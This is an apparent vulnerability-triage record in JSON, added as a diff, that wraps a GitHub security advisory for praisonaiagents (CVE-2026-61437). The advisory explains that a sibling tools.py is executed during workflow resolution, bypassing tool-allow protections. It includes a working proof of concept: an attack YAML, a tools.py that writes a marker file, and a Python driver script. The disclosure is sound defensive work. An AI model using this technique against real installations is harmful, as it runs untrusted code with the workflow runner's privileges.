@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 1, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/191675147?v=4\", \"events_url\": \"https://api.github.com/users/Nx7n/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Nx7n/followers\", \"following_url\": \"https://api.github.com/users/Nx7n/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Nx7n/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Nx7n\", \"id\": 191675147, \"login\": \"Nx7n\", \"node_id\": \"U_kgDOC2y7Cw\", \"organizations_url\": \"https://api.github.com/users/Nx7n/orgs\", \"received_events_url\": \"https://api.github.com/users/Nx7n/received_events\", \"repos_url\": \"https://api.github.com/users/Nx7n/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Nx7n/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Nx7n/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Nx7n\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-61437\", \"cvss\": {\"score\": 7.8, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.8, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}, {\"cwe_id\": \"CWE-829\", \"name\": \"Inclusion of Functionality from Untrusted Control Sphere\"}], \"description\": \"### Summary\\nAn unsafe dynamic module loading vulnerability allows an attacker who can control a workflow file and a sibling `tools.py` to execute arbitrary Python code when the workflow is executed.\\n\\n### Details\\nThe vulnerability is located in the workflow structured output resolution logic.\\n\\nFile: src/praisonai-agents/praisonaiagents/workflows/workflows.py\\n\\nMethod: AgentFlow._resolve_pydantic_class\\n\\n```python\\nif self.file_path:\\n    workflow_dir = Path(self.file_path).parent\\n    tools_path = workflow_dir / \\\"tools.py\\\"\\n\\n    if tools_path.exists():\\n        spec = importlib.util.spec_from_file_location(\\\"tools\\\", tools_path)\\n        tools_module = importlib.util.module_from_spec(spec)\\n        spec.loader.exec_module(tools_module)   # Arbitrary code execution\\n```\\n\\nThis code is reached during step execution when a step uses a string `output_pydantic`:\\n\\n```python\\nstep_output_pydantic = getattr(step, '_output_pydantic', None)\\nif step_output_pydantic and isinstance(step_output_pydantic, str):\\n    resolved_class = self._resolve_pydantic_class(step_output_pydantic)\\n```\\n\\n`file_path` is set automatically by:\\n- `WorkflowManager._load_workflow()` (used by workspace discovery)\\n- `WorkflowManager.create_workflow()`\\n\\nIt can also be set manually after `load_yaml()`:\\n```python\\nwf = mgr.load_yaml(\\\"workflow.yaml\\\")\\nwf.file_path = \\\"workflow.yaml\\\"\\n```\\n\\nThe `exec_module()` call has no sandboxing and ignores the `PRAISONAI_ALLOW_*_TOOLS` environment variables used elsewhere in the project.\\n\\n\\n### PoC\\nCreate the following two files in the same directory:\\n\\n`/tmp/attack/attack.yaml`\\n```yaml\\nname: AttackWorkflow\\nsteps:\\n  - name: generate\\n    action: \\\"Produce structured output\\\"\\n    output_pydantic: MaliciousModel\\n```\\n\\n`/tmp/attack/tools.py`\\n```python\\nprint(\\\"[RCE] Arbitrary code executed from tools.py\\\")\\n\\nimport os\\nwith open(\\\"/tmp/rce_success.txt\\\", \\\"w\\\") as f:\\n    f.write(f\\\"RCE executed by PID {os.getpid()}\\\")\\n\\nclass MaliciousModel:\\n    @classmethod\\n    def model_json_schema(cls):\\n        return {\\\"type\\\": \\\"object\\\"}\\n```\\n\\nRun the following Python code (adjust the path to your PraisonAI source):\\n\\n```python\\nimport sys\\nsys.path.insert(0, \\\"/home/user/praisonai/src/praisonai-agents\\\")\\n\\nfrom praisonaiagents.workflows import WorkflowManager\\nfrom praisonaiagents.agent.agent import Agent\\n\\nmgr = WorkflowManager()\\nwf = mgr.load_yaml(\\\"/tmp/attack/attack.yaml\\\")\\n\\nwf.file_path = \\\"/tmp/attack/attack.yaml\\\"\\n\\nfor step in wf.steps:\\n    step.output_pydantic = \\\"MaliciousModel\\\"\\n    step._output_pydantic = \\\"MaliciousModel\\\"\\n    if not getattr(step, \\\"agent\\\", None):\\n        step.agent = Agent(\\n            name=\\\"researcher\\\",\\n            role=\\\"Researcher\\\",\\n            goal=\\\"Generate output\\\",\\n            instructions=\\\"Return structured data\\\"\\n        )\\n\\nwf.start(\\\"trigger\\\")\\n```\\n\\n### Impact\\nType: Execution of Untrusted Local Code via Unsafe Dynamic Module Loading.\\n\\nAffected users include:\\n\\n- Users of `WorkflowManager(workspace_path=...)`, where workflow discovery automatically sets `file_path`.\\n- Users of `WorkflowManager.create_workflow()`.\\n- Applications that load workflows from repositories, templates, shared workflow collections, CI/CD artifacts, or other directories that may contain untrusted files.\\n\\nDuring workflow execution, a string `output_pydantic` reference causes the framework to automatically locate, import, and execute a sibling `tools.py` file.\\n\\nAs a result, code contained in `tools.py` executes with the privileges of the workflow runner without requiring an explicit import or user approval step.\\n\\nSuccessful exploitation results in arbitrary Python code execution within the workflow process. An attacker may be able to read local files, access secrets available to the process, modify workflow behavior, perform network operations, or execute additional system commands.\\n\\nThis behavior also bypasses the `PRAISONAI_ALLOW_TEMPLATE_TOOLS` / `PRAISONAI_ALLOW_LOCAL_TOOLS` protections used elsewhere in the project, allowing code execution through a separate workflow-resolution path.\", \"epss\": {\"percentage\": 0.00174, \"percentile\": 0.05989}, \"ghsa_id\": \"GHSA-4gfv-wg42-7jw5\", \"github_reviewed_at\": \"2026-10-08T16:48:57Z\", \"html_url\": \"https://github.com/advisories/GHSA-4gfv-wg42-7jw5\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-4gfv-wg42-7jw5\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-61437\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-08T16:48:57Z\", \"references\": [\"https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-4gfv-wg42-7jw5\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-61437\", \"https://www.vulncheck.com/advisories/praisonai-before-remote-code-execution-via-tools-py\", \"https://github.com/advisories/GHSA-4gfv-wg42-7jw5\"], \"repository_advisory_url\": \"https://api.github.com/repos/MervinPraison/PraisonAI/security-advisories/GHSA-4gfv-wg42-7jw5\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/MervinPraison/PraisonAI\", \"summary\": \"PraisonAI: Unsafe Dynamic Module Loading Leads to Arbitrary Code Execution via tools.py in AgentFlow\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-08T16:48:58Z\", \"url\": \"https://api.github.com/advisories/GHSA-4gfv-wg42-7jw5\", \"vulnerabilities\": [{\"first_patched_version\": \"1.6.78\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"praisonaiagents\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.6.77\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-4gfv-wg42-7jw5",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "praisonaiagents: <= 1.6.77"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-61437"
+    ],
+    "cvss_score": 7.8,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "praisonaiagents"
+    ],
+    "remote": false,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-08T19:16:36.755811Z",
+  "provenance": {
+    "content_sha256": "0b242941c559c69261fad6e450e1a85529a38bd086a92f0f673869ab11caef6a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-08T16:48:57Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-4gfv-wg42-7jw5",
+  "status": "active",
+  "title": "PraisonAI: Unsafe Dynamic Module Loading Leads to Arbitrary Code Execution via tools.py in AgentFlow",
+  "updated_at": "2026-10-08T16:48:58Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-4gfv-wg42-7jw5"
+}
